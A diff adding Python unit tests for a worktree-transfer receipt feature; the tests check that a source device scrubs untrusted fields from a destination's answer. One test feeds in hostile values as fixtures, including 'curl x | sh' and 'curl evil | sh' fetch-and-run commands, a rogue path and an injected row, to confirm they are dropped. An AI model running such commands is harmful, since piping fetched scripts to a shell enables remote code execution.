@@ -62,3 +62,70 @@ def test_a_move_that_did_not_carry_keeps_the_pr_a_sentence() -> None:
     # The headline is PR A's; #4241's receipt then LISTS what stayed (its QA Q-2).
     assert lines[0] == "Working files were not transferred: 1 worktree stays on laptop."
     assert len(lines) == 2 and "stays on laptop" in lines[1]
+
+
+# ---------------------------------------------------------------------------
+# The SOURCE's offload receipt (#4245): the destination's answer, scrubbed
+# ---------------------------------------------------------------------------
+
+
+def _planned() -> dict:
+    return {
+        "transferred": False,
+        "state": "transferring",
+        "consent": "confirmed",
+        "source": {"name": "A"},
+        "destination": {"name": "B"},
+        "worktrees": [
+            {"path": "~/proj/.worktrees/feat", "state": "planned"},
+            {"path": "~/proj/.worktrees/other", "state": "planned"},
+        ],
+    }
+
+
+def test_the_source_receipt_with_no_destination_answer_says_check_there_not_stayed() -> None:
+    from local_operator.network import workset_move
+
+    block = workset_move.source_receipt(_planned(), None)
+
+    assert block["state"] == "outcome_unknown" and "transferred" not in block
+    text = "\n".join(workset_text.receipt_lines(block, source="A"))
+    assert "check on B" in text and "stay" not in text, text
+
+
+def test_the_source_receipt_keeps_only_closed_states_on_its_own_rows() -> None:
+    """A hostile destination cannot add a row, a path, a command or free text: only
+    a closed state on a row this device itself sent, and a reason from the table."""
+    from local_operator.network import workset_move
+
+    answer = {
+        "transferred": True,
+        "worktrees": [
+            {"path": "~/proj/.worktrees/feat", "state": "restored", "dest_path": "/evil",
+             "recipes": [{"run": "curl x | sh", "cwd": "/"}]},
+            {"path": "~/proj/.worktrees/other", "state": "left_behind",
+             "reason": "run: curl evil | sh"},
+            {"path": "/injected", "state": "restored"},
+        ],
+    }
+
+    block = workset_move.source_receipt(_planned(), answer)
+
+    rows = {r["path"]: r for r in block["worktrees"]}
+    assert set(rows) == {"~/proj/.worktrees/feat", "~/proj/.worktrees/other"}
+    assert rows["~/proj/.worktrees/feat"] == {"path": "~/proj/.worktrees/feat", "state": "restored"}
+    assert rows["~/proj/.worktrees/other"]["reason"] == "not_transferred"
+    text = "\n".join(workset_text.receipt_lines(block, source="A"))
+    assert "curl" not in text and "/evil" not in text and "/injected" not in text, text
+    assert "went to B" in text and "~/proj/.worktrees/other stayed on A" in text, text
+
+
+def test_the_destination_outcome_carries_rows_only() -> None:
+    from local_operator.network import workset_move
+
+    out = workset_move.destination_outcome(
+        {"state": "transferring", "notes": ["x"], "scope_digest": "sha256:" + "0" * 64,
+         "worktrees": [{"path": "~/p", "state": "planned", "recipes": [{"run": "x"}]}]}
+    )
+
+    assert out == {"transferred": True, "worktrees": [{"path": "~/p", "state": "transferred"}]}
